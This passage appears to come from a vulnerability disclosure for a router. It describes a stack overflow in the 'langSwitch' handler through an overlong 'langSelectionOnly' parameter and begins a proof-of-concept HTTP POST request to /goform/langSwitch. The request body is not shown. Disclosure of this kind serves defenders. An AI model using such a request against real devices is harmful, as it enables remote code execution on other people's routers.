...
In the router's `langSwitch` function, `langSelectionOnly` is directly passed by the attacker, If this part of the data is too long, it will cause the stack overflow, so we can control the `langSelectionOnly` to execute arbitrary code.
...
```http
POST /goform/langSwitch HTTP/1.1
Host: 192.168.2.2
...
Cookie: session_id=xvRce3ah0oFWOhcS3tW0uPjmVsvUMIAH
